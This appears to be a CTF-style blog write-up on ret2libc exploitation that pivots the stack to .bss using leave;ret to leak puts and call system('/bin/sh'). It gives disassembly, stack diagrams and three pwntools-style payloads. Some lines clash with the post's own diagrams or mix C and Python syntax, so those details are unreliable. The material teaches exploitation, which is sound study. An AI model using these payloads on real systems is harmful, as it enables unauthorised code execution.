@@ -1,0 +1,157 @@
+---
+title: "Pwnable for Fun -- ret2libc, but pivot is needed"
+description: "This post is to archive what I have learned while bypassing a binary to execute /bin/sh with NX and partial ASLR enabled."
+pubDatetime: 2026-03-09T12:00:00+09:00
+tags:
+  - "fuzzing"
+---
+
+## pivoting to .bss for ret2libc
+
+This post will covert pivoting technique specifically. Methods like gaining libc base address or getting symbol addresses from binaries, and stack address alignment for calling system() are omitted.
+
+The `main` of the target binary is as follows:
+  
+``` asm
+pwndbg> disas main
+Dump of assembler code for function main:
+0x00000000004011dd <+0>: endbr64
+0x00000000004011e1 <+4>: push rbp
+0x00000000004011e2 <+5>: mov rbp,rsp
+0x00000000004011e5 <+8>: sub rsp,0x30
+0x00000000004011e9 <+12>: mov eax,0x0
+0x00000000004011ee <+17>: call 0x401176
+0x00000000004011f3 <+22>: lea rax,[rip+0xe0a] # 0x402004
+0x00000000004011fa <+29>: mov rdi,rax
+0x00000000004011fd <+32>: call 0x401060
+0x0000000000401202 <+37>: lea rax,[rip+0xe0e] # 0x402017
+0x0000000000401209 <+44>: mov rdi,rax
+0x000000000040120c <+47>: call 0x401060
+0x0000000000401211 <+52>: lea rax,[rbp-0x30]
+0x0000000000401215 <+56>: mov edx,0x40
+0x000000000040121a <+61>: mov rsi,rax
+0x000000000040121d <+64>: mov edi,0x0
+0x0000000000401222 <+69>: call 0x401070
+0x0000000000401227 <+74>: lea rax,[rip+0xe01] # 0x40202f
+0x000000000040122e <+81>: mov rdi,rax
+0x0000000000401231 <+84>: call 0x401060
+0x0000000000401236 <+89>: mov eax,0x0
+0x000000000040123b <+94>: leave
+0x000000000040123c <+95>: ret
+```
+
+Critical block: It calls read() at the end. It reads data from rbp-0x30 for 0x40, therefore I can overwrite SFP and return address.
+```asm
+0x0000000000401211 <+52>: lea rax,[rbp-0x30]
+0x0000000000401215 <+56>: mov edx,0x40
+0x000000000040121a <+61>: mov rsi,rax
+0x000000000040121d <+64>: mov edi,0x0
+0x0000000000401222 <+69>: call 0x401070
+```
+It is noteworthy that:
+1. The overwritten saved `rbp` must point to a mapped region. In practice, it should be a writable attacker-controlled region such as `.bss`, because the next `read()` will use `rbp-0x30` as its destination.
+2. We only have 16 bytes of overflow (that comes from `0x40 - 0x30 = 0x10`). Therefore, I cannot implement a standard ROP chain.
+3. .bss section is open to write, therefore stack pivoting is viable option for me to write something on that section.
+
+Strategy overview:
+1. First round: Overwrite SFP with `bss_section + 0xa00` and return address with the beginning of the read block in main function.
+> When main finishes, the program will return to the read block to take input while `rbp` pivots to `.bss section`, waiting for the second payload at `bss_section + 0xa00 - 0x30`
+
+2. Second round: ROP chain (`pop rdi; ret`) is placed from bss_section + 0xa00 - 0x30. `puts_got_address` (as `rdi` to leak the real memory address) followed by `puts_plt_address` (for executing `puts`), and `0x4011dd` (main) is placed. 
+  And 16 bytes of padding is appended. SFP should be overwritten with `bss_section + 0xa00 - 0x30 - 0x8` to consider `leave; ret` mechanism. Return address is overwritten with `leave; ret` address in main.
+> The program will execute `leave; ret`, which will make the buffer pivot back to the very front of `bss_section + 0xa00 - 0x30`, executing ROP gadget (remember the 0x8 is eaten up by `pop rbp` in `leave`). This ROP gadget will execute `puts` function with `rdi=puts_got_address`. As a result, puts' real time libcs address will be leaked. Lastly, the program will jump back to the beginning of main.
+
+3. Final round: main is executed as originally coded. When it hits read block, the last payload starts with ROP gadget (again, `pop rdi; ret`) followed by `binsh_addr`, `ret gadget`, and lastly, the `system_addr`. Also, 16 bytes of padding is appended followed by `bss_section + 0xa00 - 0x30 - 0x8` and `leave; ret` address in main.
+> When I hit enter, `leave; ret` is executed and, again, the process returns to `bss_section + 0xa00 - 0x30`, executing ROP chain. "/bin/sh\n" is stored in `rdi` and system call is executed.
+ 
+### Stack pivoting
+
+To pivot the stack to .bss section, I should utilize `leave; ret` instruction at the end of `main`. `leave` instruction is equivalent to:
+```asm
+mov rsp, rbp
+pop rbp
+```
+And `ret` instruction is equivalent to:
+```asm
+pop rip
+```
+
+Therefore, if I overwrite the SFP with a .bss address, e.g., `bss_section + 0xa00`, and `rip` with read block address, `leave` instruction will set `rsp` to the .bss section address, and `pop rbp` will be executed such that value (`rsp` is pointing to) is stored in `rbp` (now `rbp` is on the bss section) and `rsp` moves to the next stack. As a result, now the stack is located in `.bss section` where I can write attacker-controlled data there and use it as the new stack.
+
+> Note that `pop rbp` takes 8 bytes from the top of the stack, .bss section address overwritten to the SFP during next round of stack buffer overflow should be 8 bytes off from my ROP gadget (`pop; rdi`).
+
+#### To be more specific, I illustrate stack frames at each pivoting stage.
+
+Before `leave`:
+```asm
+    rbp = Fake_stack_in_bss
+    rsp = (old stack, not important anymore)
+```
+Fake stack at bss_section + 0xa00:
+```c
+    Fake_stack_in_bss + 0x00 : dummy value       <-- will be popped into rbp
+    Fake_stack_in_bss + 0x08 : pop rdi ; ret     <-- first actual gadget
+    Fake_stack_in_bss + 0x10 : puts@got
+    Fake_stack_in_bss + 0x18 : puts@plt
+    Fake_stack_in_bss + 0x20 : main
+```
+After `mov rsp, rbp`:
+```asm
+    rsp = Fake_stack_in_bss
+    rbp = Fake_stack_in_bss
+```
+Stack now looks like:
+```c
+    rsp -> Fake_stack_in_bss+0x00 : dummy value
+           Fake_stack_in_bss+0x08 : pop rdi ; ret
+           Fake_stack_in_bss+0x10 : puts@got
+           Fake_stack_in_bss+0x18 : puts@plt
+           Fake_stack_in_bss+0x20 : main
+```
+After `pop rbp`:
+```asm
+    rbp = *(Fake_stack_in_bss+0x00)       <-- dummy value is consumed here
+    rsp = Fake_stack_in_bss+0x08
+```
+Stack now looks like:
+```c
+    rsp -> Fake_stack_in_bss+0x08 : pop rdi ; ret
+           Fake_stack_in_bss+0x10 : puts@got
+           Fake_stack_in_bss+0x18 : puts@plt
+           Fake_stack_in_bss+0x20 : main
+```
+After `ret`:
+```asm
+    rip = *(Fake_stack_in_bss+0x08+0x08) = pop rdi ; ret
+    rsp = Fake_stack_in_bss+0x08+0x10
+```
+### My payloads at each read round
+
+The first payload:
+```c
+first_payload = b'A' * 0x30;
+first_payload += p64(bss_section + 0xa00) 
+first_payload += p64(0x401211);  // This will make the process return to 0x401211, the block that computes rbp-0x30 and invokes read()
+```
+
+The second payload:
+```c
+second_payload = p64(pop_rdi_ret_addr) \\ from ROPgadget ./target
+second_payload += p64(ELF('./target').got['puts'])  
+second_payload += p64(puts_plt_addr)
+second_payload += p64(0x4011dd)
+second_payload += b'B' * 16
+second_payload += p64(bss_section + 0xa00 - 0x30 - 0x8)   
+second_payload += p64(leave_ret_addr)      
+```
+
+The final payload:
+```c
+final_payload  = p64(pop_rdi_ret_addr)
+final_payload += p64(binsh_addr)   // binsh_addr  = libc_base + next(libc.search(b'/bin/sh\x00'))
+final_payload += p64(ret_addr)     // for alignment
+final_payload += p64(system_addr)      // system_addr = libc_base + libc.symbols['system']
+final_payload += b'C' * 16
+final_payload += p64(bss_section + 0xa00 - 0x30 - 0x8)
+final_payload += p64(leave_ret_addr)
+```
